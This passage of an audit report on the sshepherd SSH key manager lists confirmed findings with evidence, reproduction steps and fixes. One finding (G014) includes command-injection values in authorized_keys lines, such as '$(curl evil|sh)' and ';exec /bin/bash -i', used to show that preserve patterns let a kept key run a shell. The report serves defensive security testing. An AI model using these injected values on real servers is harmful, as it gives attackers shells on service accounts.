import.go:35-42: `raw, err := os.ReadFile(out) ... old, err := config.Parse(raw); if err != nil { return nil }` with comment 'Best effort: a missing or invalid file has nothing to lose.' Probe (binary built from 9722c42 in own worktree): `validate --config m2.yaml` exit 0; `validate --config m3.yaml` -> 'error: parse manifest: yaml: unmarshal errors: line 6: field tag not found in type config.Server' exit 3. `import ssh_config --servers-only -o m2.yaml --force` -> 'warn: m2.yaml holds revocation memory (serial 7, 1 revoked: entry) that this fresh import drops: ...' exit 0. Same on m3.yaml -> only '• parsed ssh_config: 1 host', exit 0. `grep -c fingerprint m2.yaml m3.yaml` -> 0 / 0. README.md:1738-1741 'A fresh `import -o FILE --force` without `--merge` over a manifest holding revocation memory warns ...'. Plan 2026-11-10-p10-f1-owner-followups.md line 30: scope 'over a FILE that parses (warnMemoryLost's best-effort rule)'.
~~~~

</details>

#### G008 [medium] Import keeps the HostName/alias case that ssh lowercases, and the case-sensitive known\_hosts lookup then reports a host ssh knows as host key unknown; the ssh -G differential hides this with EqualFold

- **Status:** CONFIRMED
- **Lens(es):** gap-import-pipeline-sshcfg-reconcile-f1 (raw ids: K7-5)
- **Location:** internal/sshcfg/sshcfg.go:234-243 (HostName kept verbatim); cmd/sshepherd/import.go:136 (Host: h.HostName); internal/sshconn/connect.go:216 (addr from srv.Host verbatim); internal/sshcfg/sshg\_diff\_test.go:47 (strings.EqualFold on hostname)
- **Verifier votes:** single: reproduced (sev medium)

**Evidence** (verbatim from the finding):

~~~~text
`Host db / HostName DB01.Corp.Example / User u`: `ssh -G db` -> 'hostname db01.corp.example'; `sshepherd import --servers-only` -> 'host: DB01.Corp.Example'. Probe test in sshconn with a known_hosts line 'web ssh-ed25519 <key>': kh.callback("web:22") -> <nil>; kh.callback("Web:22") -> 'knownhosts: key is unknown'. Alias `Host Web` with no HostName likewise imports host 'Web' (probe c2) while ssh -G prints 'hostname web'.
~~~~

**Repro:**

~~~~text
Import a config whose HostName or alias has upper-case letters, with a known_hosts entry written by ssh, then audit that server.
~~~~

**Impact:** Fails closed (exit 1, host key unknown with a keyscan hint), but every such imported server is unreachable until the operator edits host: by hand or adds a mixed-case known\_hosts entry. The differential that should catch it compares case-insensitively.

**Fix direction:** Lowercase HostName (after %h expansion) in sshcfg as ssh does, or lowercase the host for the known\_hosts lookup. Make diffHost compare hostname exactly and add a mixed-case fixture.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev medium):

~~~~text
ssh -G -F cfg db -> 'hostname db01.corp.example'; ssh -G -F cfg Web -> 'hostname web'. sshepherd import cfg --servers-only (built from 9722c42) -> 'name: db / host: DB01.Corp.Example' and 'name: Web / host: Web'. Probe TestG008Probe in internal/sshconn (worktree): known_hosts line knownhosts.Line(["[localhost]:PORT"], hostkey); Connect host="localhost" err=<nil>; host="LocalHost" err='ssh deploy@LocalHost:51548: presented ssh-ed25519 key SHA256:/IOz...: knownhosts: key is unknown'. Code: internal/sshcfg/sshcfg.go:234-243 (h.HostName = alias / expandHostName, no lowercasing); cmd/sshepherd/import.go:120 'Host: h.HostName'; internal/sshconn/connect.go:216 'addr := net.JoinHostPort(srv.Host, ...)'; x/crypto knownhosts.go:109-110 'wildcardMatch([]byte(p.addr.host), []byte(a.host))' (case-sensitive byte compare); internal/sshcfg/sshg_diff_test.go:47 'if !strings.EqualFold(h.HostName, first("hostname"))'.
~~~~

</details>

#### G009 [medium] Ctrl-Z at the passphrase prompt then fg: the passphrase is echoed in clear (no SIGTSTP/SIGCONT handling, unlike readpassphrase(3))

- **Status:** CONFIRMED
- **Lens(es):** gap-keyfile-private-key-handling (raw ids: K2-1)
- **Location:** internal/keyfile/tty\_unix.go:70 (echoOff applied once per attempt), :93-100 (select waits only on the read and ctx); cmd/sshepherd/run.go:127 (signal.Notify only os.Interrupt, SIGTERM)
- **Verifier votes:** single: reproduced (sev medium)

**Evidence** (verbatim from the finding):

~~~~text
echoOff keeps ISIG (tty_unix.go:119 `noEcho.Lflag |= unix.ICANON | unix.ISIG`), so Ctrl-Z sends SIGTSTP; nothing catches it, so the process stops with ECHO cleared. While it is stopped the shell resets the tty to its own mode (probe ran `stty -a` in the stopped state: `echo`), and on `fg` neither bash nor zsh puts back the job's no-echo mode; ReadPassphrase never re-applies echoOff, so the read continues with echo on. PTY probe (python driving `bash --norc -i` and `zsh -f -i`, real binary built from 9722c42: `sshepherd audit --config m.yaml --known-hosts kh --identity enc_key`, enc_key = ed25519 with a passphrase): wait for `Enter passphrase`, send ^Z, `fg`, type `TYPEDSECRET99\n`. Output after fg, bash 5 (Homebrew): `./sshepherd audit ... --identity enc_key` / `TYPEDSECRET99` / `Bad passphrase, try again for .../enc_key:`. zsh 5: `[1]  + continued  ./sshepherd audit ...` / `TYPEDSECRET99`. Probe verdict on both shells: `---- TYPEDSECRET99 echoed: True`. Only the first attempt after the resume leaks (the next attempt calls echoOff again, and the following typed line was not echoed). tty_pty_test.go covers only cancel (TestTTYCanceledPromptRestoresEcho); no test sends SIGTSTP/SIGCONT.
~~~~

**Repro:**

~~~~text
ssh-keygen -t ed25519 -N secretpw -f k; sshepherd audit --identity k (with any one-server manifest and a known_hosts file) in an interactive bash or zsh; at `Enter passphrase for ...`, press Ctrl-Z, run `fg`, type the passphrase: it is shown on the screen (and lands in scrollback, tmux/screen logs, screen shares).
~~~~

**Impact:** The passphrase of an --identity private key, the highest-value secret the tool handles, is displayed on the terminal when an operator suspends at the prompt (for example to look the passphrase up) and resumes. OpenSSH's readpassphrase(3) handles exactly this (it restores the tty on SIGTSTP/SIGTTIN/SIGTTOU, re-raises, and re-disables echo and reprints the prompt on resume); ssh users expect the same.

**Fix direction:** While the prompt is up, signal.Notify for SIGTSTP, SIGTTIN, SIGTTOU and SIGCONT: on a stop signal restore the saved termios, signal.Reset that signal and re-raise it (syscall.Kill(0 or own pid)); on SIGCONT re-run echoOff and rewrite the prompt. Simpler alternative: signal.Ignore(SIGTSTP) for the prompt's duration and re-apply echoOff on SIGCONT. Add a pty test that stops and continues the prompter and asserts ECHO is off when the read resumes.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev medium):

~~~~text
PTY probe (python pty driving bash --norc -i / zsh -f -i): ./sshepherd audit --config m.yaml --known-hosts kh --identity ./k (ed25519, passphrase secretpw). After 'Enter passphrase for ...': ^Z -> bash '[1]+ Stopped', `stty -a` in stopped state shows 'echo '; fg; type TYPEDSECRET99. bash AFTER: b'TYPEDSECRET99\r\n\r\nBad passphrase, try again for .../k: ' ECHOED: True. zsh: '[1]  + continued  ./sshepherd audit ...' then b'TYPEDSECRET99\r\n\r\nBad passphrase...' ECHOED: True. Second line TYPEDSECRET77 not echoed (False). Control without ^Z: CTRL: b'\r\nBad passphrase, try again...' (no echo). Code: tty_unix.go:70 `restore, err := echoOff(f)`, :119 `noEcho.Lflag |= unix.ICANON | unix.ISIG`, run.go:127 `signal.Notify(sigs, os.Interrupt, syscall.SIGTERM)`.
~~~~

</details>

#### G010 [medium] FuzzRemoveAccess and FuzzManifestEdit check only the targeted pair/key, never the frame: an edit that grants or drops anything else passes

- **Status:** CONFIRMED
- **Lens(es):** gap-manifest-store-and-editor (raw ids: K1-2)
- **Location:** internal/manifest/fuzz\_edit\_test.go:163-169 (FuzzRemoveAccess: only `after.Covers(user, server)`), fuzz\_edit\_test.go:100-121 (FuzzManifestEdit: removed fp unowned, tombstoned, serial+1); internal/manifest/fuzz\_test.go:43-51 (FuzzMergeRoundTrip compares user names, server names and access pairs only: not keys, flags, groups, tags, via, preserve, options, revoked, serial)
- **Verifier votes:** single: reproduced (sev medium)

**Evidence** (verbatim from the finding):

~~~~text
Seeded FuzzRemoveAccess (worktree testdata, removed after) with the K1-1 manifest and pick=1 (carol, web-1): `--- PASS: FuzzRemoveAccess/k1-merge-except`, although the edit makes carol cover db-1 (coverage probe above). A second seed with `<<: {servers: [web-1]}` does fail (`"bob" still covers "web-1" after RemoveAccess`), so the target also has a crasher the daily 2-minute fuzz has not found. Unit tests are strong for ordinary mutants (my mutants removing the user filter in RemoveAccess, dropping whole group member lists, replacing revoked: on append, deleting selector entries were each killed by 2-11 tests), so the gap is specifically the fuzzers' oracle on shapes no unit test enumerates.
~~~~

**Repro:**

~~~~text
Add the K1-1 manifest as a FuzzRemoveAccess corpus entry with uint8(1) and run `go test -run FuzzRemoveAccess/<name> ./internal/manifest/`: it passes.
~~~~

**Impact:** The fuzz targets exist to catch shapes no hand-written test anticipates, but their oracles cannot see a grant added to another server or user, a lost tombstone, a flipped operator/protected flag or a dropped grant option, which are the security-relevant failures of a manifest edit.

**Fix direction:** Add a frame oracle: for every (user, server) pair other than the target, after.Covers == before.Covers (and DesiredFor per server is unchanged except for the target user/key); every pre-existing tombstone is still present; users' Operator/Protected and other users' keys are unchanged. Extend FuzzMergeRoundTrip to compare the full config (DeepEqual of Users/Groups/Servers/Access/Tombstones/Serial).

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev medium):

~~~~text
Worktree 9722c42, seed testdata/fuzz/FuzzRemoveAccess/probe-g010-merge-except + probe test: `--- PASS: FuzzRemoveAccess/probe-g010-merge-except`; `TestProbeG010Frame: carol db-1 before=false after=true` / `FRAME VIOLATION: carol/db-1 coverage false -> true`; encoded output `except: [web-1]\n    !!merge <<: {except: [db-1]}`. Oracle code: internal/manifest/fuzz_edit_test.go:167 `if after.Covers(user, server) {` is the only post-edit semantic check.
~~~~

</details>

#### G011 [medium] macOS: --config /dev/stdin redirected from a file (or /dev/fd/N on a regular file) makes every writing apply exit 3 with a false 'changed since it was read', and revoke gets a lock error instead of the documented refusal

- **Status:** CONFIRMED
- **Lens(es):** gap-manifest-store-and-editor (raw ids: K1-3)
- **Location:** internal/manifest/store.go:44-51 (Stream = !regular; Resolved = EvalSymlinks("/dev/stdin") = "/dev/fd/0" on darwin), store.go:58-69 (Unchanged re-opens the resolved path: on darwin that dups the same descriptor, whose offset is at EOF), store.go:148 (lock creates /dev/fd/.0.sshepherd-lock); README.md:862, README.md:3323, README.md:3342-3343
- **Verifier votes:** single: reproduced (sev medium)

**Evidence** (verbatim from the finding):

~~~~text
Darwin probe: `PROBE_PATH=/dev/stdin manifest.test < m.yaml` -> `Stream=false Resolved="/dev/fd/0" loaded=10 bytes`, `Unchanged() = manifest /dev/stdin changed since it was read; re-run`; same for `/dev/fd/3 3< m.yaml`. In-process cmd probe (copy of TestApplyManifestFromPipe with an opened regular file passed as /dev/fd/N, sshtest fleet): `apply --yes` printed the plan, `applying 1 server`, then `error: manifest /dev/fd/6 changed since it was read; re-run`, exit 3, authorized_keys unchanged. Real binary: `revoke carol --no-apply --yes --config /dev/stdin < m2.yaml` -> `error: lock manifest: open /dev/fd/.0.sshepherd-lock: no such file or directory`, exit 3 (a pipe gets the documented `cannot edit /dev/stdin: not a regular file`). On Linux the same redirect resolves through /proc to the real file (`Resolved="/tmp/m.yaml"`, Unchanged nil), so the platforms diverge.
~~~~

**Repro:**

~~~~text
On macOS: `sshepherd apply --yes --config /dev/stdin < sshepherd.yaml` against any fleet where a write is needed.
~~~~

**Impact:** README's `--config` row says `/dev/stdin` works; on macOS a redirected manifest can never be applied when anything must be written (always exit 3, and the message tells the user something changed their manifest, which is false). revoke/rotate fail with an obscure lock path instead of the documented stream refusal. Fails closed; workaround: pass the file path or pipe through cat.

**Fix direction:** In Read, treat a path under /dev/fd or /dev/stdin whose resolved path is still under /dev (EvalSymlinks did not reach a real file) as a Stream, or re-read via the already-open descriptor (pread at offset 0) instead of re-opening; add a darwin test with a redirected regular file.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev medium):

~~~~text
Store probe (darwin, worktree build): `probe /dev/stdin < m.yaml` -> `Stream=false Resolved="/dev/fd/0" loaded=10`, `Unchanged()=manifest /dev/stdin changed since it was read; re-run`; `probe /dev/fd/3 3< m.yaml` -> same with /dev/fd/3; piped -> Stream=true, Unchanged nil; plain path -> nil. Real binary: `sshepherd revoke carol --no-apply --yes --config /dev/stdin < m2.yaml` -> `error: lock manifest: open /dev/fd/.0.sshepherd-lock: no such file or directory` exit=3; piped -> `error: cannot edit /dev/stdin: not a regular file — ...` exit=3; real path -> exit 0. In-process cmd probe (editFleet sshtest fleet, regular file opened and passed as /dev/fd/6): `apply --yes` printed plan (1 remove, 1 rewrite), `applying 1 server`, then `error: manifest /dev/fd/6 changed since it was read; re-run`, exit=3, authorized_keys unchanged. Code: internal/manifest/store.go:44 `Stream: !fi.Mode().IsRegular()`, :48 `filepath.EvalSymlinks(path)`, :62 `os.ReadFile(s.Resolved)`; README.md:862 `Path to the manifest (`/dev/stdin` and a pipe work)`.
~~~~

</details>

#### G012 [medium] A lock sidecar left by another uid (one sudo run, or a group member's refused save) locks the manifest's owner out of every revoke/rotate/serial bump with a bare EACCES; the documented 'owned by uid U … remove it' message cannot fire for a 0600 sidecar

- **Status:** CONFIRMED
- **Lens(es):** gap-manifest-store-and-editor (raw ids: K1-4)
- **Location:** internal/manifest/store\_unix.go:34 (OpenFile O\_RDWR|O\_CREATE, mode 0600, never deleted), store\_unix.go:61-79 (checkLockFile is reached only after a successful open), internal/manifest/store.go:148 vs 169 (lock is created before keepOwner refuses a non-owner); README.md:3328-3333
- **Verifier votes:** single: reproduced (sev low)

**Evidence** (verbatim from the finding):

~~~~text
Docker probes (alpine, Linux test binary of internal/manifest calling Read+Save): (a) root saves a nobody-owned manifest -> `saved ok as euid 0`, sidecar `-rw------- root root .sshepherd.yaml.sshepherd-lock`; then nobody (the manifest's owner) -> `SAVE ERROR: lock manifest: open /m/.sshepherd.yaml.sshepherd-lock: permission denied`. (b) dir alice:ops 2770, manifest alice:ops 0660; bob (in ops) saves -> `would change the manifest's owner (100:101): chown ...: operation not permitted`, but leaves `-rw------- bob ops .sshepherd.yaml.sshepherd-lock`; then alice -> `SAVE ERROR: lock manifest: open /m/.sshepherd.yaml.sshepherd-lock: permission denied`.
~~~~

**Repro:**

~~~~text
As the manifest owner run `sudo sshepherd revoke X --no-apply --yes` once, then `sshepherd revoke Y --no-apply --yes`: exit 3, `lock manifest: open …: permission denied`, on every later run.
~~~~

**Impact:** The owner cannot offboard anyone (revoke/rotate) or land a removal apply's serial bump until they find and delete a hidden dotfile; the error gives no remedy, and the README's promised `remove it and re-run` wording only appears for a foreign sidecar that happens to be writable by everyone. The code comment 'so sudo on your own manifest still works' covers only the user-first order.

**Fix direction:** On EACCES/EPERM from the sidecar open, stat it (Lstat) and return the same `owned by uid U … remove it and re-run` refusal; chown a sidecar created under sudo to the manifest's owner (as keepOwner does for the manifest); and take keepOwner's ownership check before creating the sidecar so a refused save leaves nothing behind.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev low):

~~~~text
store_unix.go:34 `f, err := os.OpenFile(path, os.O_RDWR|os.O_CREATE|syscall.O_NOFOLLOW|syscall.O_NONBLOCK, 0o600)`; :39 `return nil, fmt.Errorf("lock manifest: %w", err)`; :78 the owned-by-uid message (after the open). store.go:148 `unlock, err := lock(s.Resolved)` before store.go:169 `keepOwner(tmp, fi)`. README.md:3328-3333 lists `… is owned by uid U, not by you (uid V) or the manifest's owner — remove it and re-run`. Probe (python:3.12-alpine, linux manifest.test with a Read+Save probe test built in my worktree): `== (a) root (sudo) saves nobody-owned manifest` -> `saved ok as euid 0`; `-rw------- 1 root root 0 .fleet.yaml.sshepherd-lock`; `== then the owner (nobody) saves` -> `SAVE ERROR: lock manifest: open /m/.fleet.yaml.sshepherd-lock: permission denied` (same again). `== (b)` bob in ops, dir alice:ops 2770 -> `SAVE ERROR: save manifest /g/f.yaml: would change the manifest's owner (100:101): chown /g/.f.yaml.tmp-2331539376: operation not permitted`, leaves `-rw------- 1 bob ops 0 .f.yaml.sshepherd-lock`; alice -> `SAVE ERROR: lock manifest: open /g/.f.yaml.sshepherd-lock: permission denied`. TestStoreLockRefusesForeignOwner (store_test.go:365) uses the ownerOf seam only.
~~~~

</details>

#### G013 [medium] A writable single-file bind mount (README's docker run shape without :ro) cannot be saved: rename over a mount point fails EBUSY, and the lock sidecar lands in the container's own directory

- **Status:** CONFIRMED
- **Lens(es):** gap-manifest-store-and-editor (raw ids: K1-5)
- **Location:** internal/manifest/store.go:160-179 (temp in filepath.Dir(Resolved), os.Rename over Resolved), store.go:183-185 (LockPath next to the resolved file); README.md:3104-3119 (`mount it from a writable volume`; docker run binds sshepherd.yaml as a single file)
- **Verifier votes:** single: reproduced (sev low)

**Evidence** (verbatim from the finding):

~~~~text
Docker probe: `-v host/sshepherd.yaml:/work/sshepherd.yaml` (writable), Read+Save -> `SAVE ERROR: save manifest /work/sshepherd.yaml: rename /work/.sshepherd.yaml.tmp-1624733152 /work/sshepherd.yaml: device or resource busy`.
~~~~

**Repro:**

~~~~text
`docker run --rm -v "$PWD/sshepherd.yaml:/work/sshepherd.yaml" -w /work sshepherd:dev revoke bob --no-apply --yes` (or an apply that removes keys and must bump serial:).
~~~~

**Impact:** In the container, revoke, rotate, a removal apply's serial bump and in-place adopt/import -o all exit 3 after the plan and confirmation. Even when the directory is not the mount, the sidecar for a single-file mount sits in the container's ephemeral /work, so it never excludes a concurrent host run (only the byte compare-and-swap remains). Fails closed. Related to F006 (read-only mounts); this is the writable case its fix would point users to.

**Fix direction:** Document that the manifest must be mounted as a directory (e.g. `-v "$PWD:/work"`) for any command that saves it, and map EBUSY/EXDEV from the rename to a hint saying so.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev low):

~~~~text
Probe (linux binary from worktree at 9722c42, python:3.12-alpine): `-v single.yaml:/work/sshepherd.yaml` -> `manifest edit: remove user bob ... error: save manifest sshepherd.yaml: rename ./.sshepherd.yaml.tmp-88310084 sshepherd.yaml: device or resource busy` exit=3, /work holds `.sshepherd.yaml.sshepherd-lock` (container-local), host file still has bob. `-v dir:/work` -> `manifest sshepherd.yaml updated` exit=0. store.go:175 `if err := os.Rename(tmp.Name(), s.Resolved); err != nil {`; grep for EBUSY/EXDEV in internal/manifest and cmd: none; README.md:3108 `manifest, so mount it from a writable volume for those.`
~~~~

</details>

#### G014 [medium] command: pattern validation accepts patterns that admit shell metacharacters, and sshd runs command= through the user's shell, so a kept line can run any command

- **Status:** CONFIRMED
- **Lens(es):** gap-preserve-external-keys (raw ids: K5-2)
- **Location:** internal/config/preserve.go:36-46 (preserveProbes: only whole-value '/bin/sh' and '/usr/bin/rrsync /srv' for commands) and :84-112 (compilePreserve)
- **Verifier votes:** single: reproduced (sev medium)
- **Owner decision:** yes: should command: patterns be refused when they can match shell metacharacters (syntax-tree check), checked with prefix-derived probes, or only warned about in the README?

**Evidence** (verbatim from the finding):

~~~~text
Probe TestK5Probe: rule {command: '/usr/local/bin/gitea --config=/etc/gitea/app\.ini serv .*'} loads; lines 'command="/usr/local/bin/gitea --config=/etc/gitea/app.ini serv key-1;exec /bin/bash -i" <key> stranger' and '...serv $(curl evil|sh)" <key> stranger' both: external=1 unauthorized=0 compliant=true exit=0. sshd's session.c runs a forced command as `$SHELL -c "<command>"`, so ';', '$(…)', '|', backticks and '&' in a kept value execute. The same holds for '\S+' or '[^ ]+' tails ('key-1;bash' has no space).
~~~~

**Repro:**

~~~~text
preserve: [{command: '/usr/local/bin/gitea serv .*'}] (a natural first attempt; README's worked example uses key-[0-9]+, but nothing refuses '.*'); plant `command="/usr/local/bin/gitea serv x;bash -i" <key>`; sshepherd audit exit 0, apply keeps it; ssh git@host gives an interactive shell on the service account.
~~~~

**Impact:** A command: rule with a permissive tail is as weak as a comment: rule (anyone who can write the file keeps a full-shell key), but the README presents command: rules as the safe kind and validation reports nothing. The nine-probe check gives a false sense that broad patterns are refused.

**Fix direction:** Refuse a command: pattern that can match a shell metacharacter (inspect the regexp/syntax tree: reject '.', negated classes and classes containing ;|&$`()&lt;>\\n and quotes), or add probes such as &lt;literal prefix>+';/bin/sh' and &lt;prefix>+'$(id)' built from the pattern's own prefix; document the rule in README validation rules.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev medium):

~~~~text
Probe in own worktree (internal/config/zz_g014_probe_test.go, removed): pattern "/usr/local/bin/gitea serv .*" loads; cmd "/usr/local/bin/gitea serv key-1;exec /bin/bash -i" -> rule "command"; cmd "... serv $(curl evil|sh)" -> "command"; cmd "... serv x&&bash" -> "command". Pattern "/usr/local/bin/gitea serv \\S+" and "[^ ]+" load; cmd "... serv x&&bash" -> "command". Pattern "...--config=/etc/gitea/app\\.ini serv .*" loads; matching cmd with ';exec /bin/bash -i' -> "command". Real sshd (sshepherd-it-sshd:alpine, container v-G014-single-sshd, removed): authorized_keys line command="/usr/local/bin/gitea serv key-1;id;echo PWNED-via-shell" <key>; ssh git@127.0.0.1 printed 'sh: /usr/local/bin/gitea: not found' / 'uid=1000(git) gid=1000(git) groups=1000(git)' / 'PWNED-via-shell'. README.md: 'Comment rules are weaker. ... Prefer command: rules, which match what the line runs.' preserve.go:41-44 probes list has only "/bin/sh" and "/usr/bin/rrsync /srv" as command-like probes.
~~~~

</details>

#### G015 [medium] adopt turns a key that is kept on a preserve: server and plain elsewhere into a user owning it; the next audit flags the tool's line, apply deletes it, and adopt --merge then grants the key on the tool's account as a plain shell line with no adopt warning

- **Status:** CONFIRMED
- **Lens(es):** gap-preserve-external-keys (raw ids: K5-3)
- **Location:** internal/adopt/adopt.go:112-146 (Build reads only Diff.Unauthorized; extensions for owned keys); internal/audit/preserve.go:44-49 (neverKept: owned keys are never kept)
- **Verifier votes:** single: reproduced (sev medium)
- **Owner decision:** yes: when a key is kept by preserve: on one server and plain on another, should adopt skip it, adopt it with a warning, or adopt it and never extend it to the preserve server?

**Evidence** (verbatim from the finding):

~~~~text
Probe TestK5AdoptPreserve (internal/adopt): gitea has preserve command rule and the line 'command="/usr/local/bin/gitea serv key-7",no-port-forwarding,no-pty K dev@laptop'; web-1 has plain 'K dev@laptop'. Output: 'pass0 audit gitea: external=1 unauthorized=0'; 'pass0 adopt: newusers=[{Name:dev-laptop ... FoundOn:[web-1]}] ext=[] warnings=[]'; with that manifest: 'pass1 audit gitea: external=0 unauthorized=1 compliant=false'; 'pass1 adopt --merge: ext=[{User:dev Servers:[gitea]}] warnings=[]'; then DesiredFor(gitea) = plain 'ssh-ed25519 ...K dev@laptop'. Probe TestK5PlanAfterMerge (internal/apply): the plan is a rewrite with Loosens=[command="/usr/local/bin/gitea serv key-7" no-port-forwarding no-pty], rendering K without options on git's account.
~~~~

**Repro:**

~~~~text
A developer uses one key for Gitea (Gitea writes its command= line in git's authorized_keys) and for a server. sshepherd adopt -o m.yaml: no warning; sshepherd audit: gitea now drift (the Gitea line is unauthorized); sshepherd apply removes Gitea's line (developer loses Gitea SSH). sshepherd adopt --merge m.yaml extends dev to gitea; apply rewrites the key as a plain line: an unrestricted shell as git (only apply's loosening highlight shows it).
~~~~

**Impact:** adopt's output is not a converged manifest for fleets using preserve: (adopt -> audit is not clean), the documented fix-up flow converts a forced-command tool key into a shell on the service account, and adopt says nothing at either step. Reusing one personal key for Gitea and servers is common.

**Fix direction:** In adopt.Build, when a newly adopted key is External on any server, warn (new kind) that adopting it will remove the tool's line there, or skip adopting it; in the --merge extension path never extend a user onto a server where the key was found only as a preserve:-matching line (warn instead).

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev medium):

~~~~text
Probe TestG015Probe (worktree, internal/adopt): 'pass0 gitea: external=1 unauthorized=0'; 'pass0 web-1: external=0 unauthorized=1'; 'pass0 adopt: newusers=[{Name:dev-laptop ... FoundOn:[web-1]}] ext=[] warnings=[]'; 'pass1 gitea: external=0 unauthorized=1 compliant=false'; 'pass1 adopt --merge: ext=[{User:dev Servers:[gitea]}] warnings=[]'; 'pass2 desired gitea: options=[] comment="dev@laptop"'. Code: internal/audit/preserve.go neverKept: '_, owned := cfg.OwnerOf(k.Fingerprint) ... return owned || revoked || ...'; internal/adopt/adopt.go Build loops 'for _, first := range r.Diff.Unauthorized' with no External check. Mitigating docs: README.md:574-577 'Give the tool's account a separate key: a key the manifest owns is collapsed to its managed line, and the tool's line for it is removed.'; spec S6 'Lines that are never preserved: A line whose fingerprint the manifest owns. The manifest wins.' Contradicted doc: README.md:1770-1773 'emit a complete new manifest in which every installed key is accounted for'.
~~~~

</details>

#### G016 [medium] sshd's default PerSourcePenalties (on all three shipped distros) turns a few failed-auth accounts into 'handshake failed: EOF' with no hint for every healthy account on that host, and the harness turns penalties off on all three containers so this path is never tested

- **Status:** CONFIRMED
- **Lens(es):** gap-real-sshd-integration-and-scripts (raw ids: K3-1)
- **Location:** scripts/integration.sh:176, :201, :215 (`PerSourcePenalties no` on containers A, B and C); internal/sshconn/errors.go:80-97 (handshakeKind: a pre-banner drop is plain `handshake`); internal/sshconn/connect.go:333 (a hint is given only through authHint); README.md (no mention of PerSourcePenalties)
- **Verifier votes:** single: reproduced (sev medium)
- **Owner decision:** yes: should SSHepherd only explain penalty drops (hint plus README), or also change its fan-out (per-host serialization, or reading accounts that may fail last) to avoid triggering them?

**Evidence** (verbatim from the finding):

~~~~text
Probe container from sshepherd-it-sshd:alpine (OpenSSH_10.3p1), stock sshd_config: `sshd -T` -> `persourcepenalties crash:90 authfail:5 noauth:1 ... min:15`. Accounts bad1..bad4 (empty authorized_keys) and good1..good4 (the agent key); manifest grants one user on all 8 (`servers: ["*"]`). `sshepherd audit --parallel 1 --json`: `bad1 unreachable auth`, `bad2 unreachable handshake | handshake failed: EOF`, `bad3 auth`, `bad4 handshake EOF`, `good1/good2/good3 unreachable handshake | ssh goodN@127.0.0.1:51200: ssh: handshake failed: EOF | <empty hint>`, `good4 compliant`; sshd log: `srclimit_penalise: 172.17.0.1/32: activating ipv4 penalty of 15.854 seconds for penalty: failed authentication` and `drop connection #0 from [172.17.0.1]:64204 ... penalty: failed authentication`. With the default --parallel 32 the first run read good1-4, and an audit right after it reported all 8 accounts `unreachable handshake ... handshake failed: EOF`, text summary `0/8 servers compliant ... 8 unreachable -> exit 1`, no hint line. The default policy exists in every shipped sshd: alpine 10.3p1, debian 10.0p2 (1:10.0p1-7+deb13u4), rocky 9.9p1 (PerSourcePenalties is 9.8+). integration.sh:171-176 says why it is off ('OpenSSH 9.8+ penalizes a source address after failed logins and then drops its handshakes'), and grep finds no handling or doc of it outside the harness and the P08 spec's retry rationale.
~~~~

**Repro:**

~~~~text
Run a stock OpenSSH >= 9.8 sshd with several accounts in the manifest, some of which do not yet hold the key (first contact, an account that was never bootstrapped, a key removed by hand). Run `sshepherd audit` (or adopt/apply, whose read phase is the same) twice, or once with --parallel 1. The healthy accounts after the third or so failed login, and every account on the next run within about 15 s, report `ERROR [handshake]: ... handshake failed: EOF` with no hint.
~~~~

**Impact:** In normal use (one admin IP, many accounts per host, a few not yet keyed) audit/adopt/apply misreport healthy servers as unreachable with an opaque EOF. Monitoring flaps between exit 0 and 1 depending on fan-out order, adopt marks hosts unreadable, and apply skips servers it could have written. The operator gets no pointer to the cause, which is in the server's log. Through a bastion every target sees the bastion's address, so one failing target account penalizes the whole hop's traffic. Because all three harness containers disable the penalty, nothing proves how the post-write login check and the reconnect behave when a penalty drops them. By the P08 design that should be TRANSIENT, retried, then UNPROVEN, but it is untested against real sshd.

**Fix direction:** Keep one integration container (or one test) on the distro's default PerSourcePenalties and pin audit's and the login check's classification there. Give a handshake EOF that arrives before the server's version banner a hint (for example 'the server closed the connection before its banner: sshd PerSourcePenalties after failed logins from this address, MaxStartups, or a firewall; check the server log for "drop connection ... penalty"'). Consider ordering or limiting connections per host:port, so one host's failing accounts do not use up its healthy ones within a run. Document the interaction in README's connection-posture section.

<details><summary>Verifier evidence (verbatim)</summary>

**single** (reproduced, sev medium):

~~~~text
sshd -T in the container: 'persourcepenalties crash:90.000000 authfail:5.000000 noauth:1.000000 ... min:15.000000'; 'OpenSSH_10.3p1'. Run 1 (--parallel 1 --json): bad1-4 'unreachable auth', good1-4 'compliant'; sshd: 'srclimit_penalise: 172.17.0.1/32: activating ipv4 penalty of 19.915 seconds for penalty: failed authentication'. Run 2 immediately after (default --parallel 32 --json): all 8 'unreachable handshake | ssh goodN@127.0.0.1:51575: ssh: handshake failed: EOF | hint= None'. Run 3 (text): 'good1 (good1@127.0.0.1:51575)  ERROR [handshake]: ssh good1@127.0.0.1:51575: ssh: handshake failed: EOF' ... 'Summary: 0/8 servers compliant · 0 with drift (0 critical) · 8 unreachable  → exit 1', no hint line; sshd: 'drop connection #0 from [172.17.0.1]:65460 on [172.17.0.3]:22 penalty: failed authentication'. Code: connect.go:333 'return &Error{Kind: kind, Err: wrapped, Hint: f.offer.authHint(kind), AuthExhausted: exhausted}'; authHint returns "" when kind != auth; integration.sh:176/201/215 set 'PerSourcePenalties no'.
~~~~

</details>

#### G017 [medium] The paste-ready lock-removal command ignores via:, so for a server behind a bastion it ssh-es straight to an address the operator cannot reach (or to a different machine with that address)

- **Status:** CONFIRMED
- **Lens(es):** gap-remote-posture-lock-probe-header (raw ids: K4-1)
- **Location:** internal/sshwrite/lock.go:112-122 (lockRemoveCmd uses only srv.User, srv.Host, srv.Port); lock.go:95-97 (lockedErrorFor); compare internal/sshconn/hostkey.go:115-141 (keyscanCompareCmd routes through the bastion with -J or 'on bastion NAME:')
- **Verifier votes:** single: reproduced (sev medium)

**Evidence** (verbatim from the finding):

~~~~text
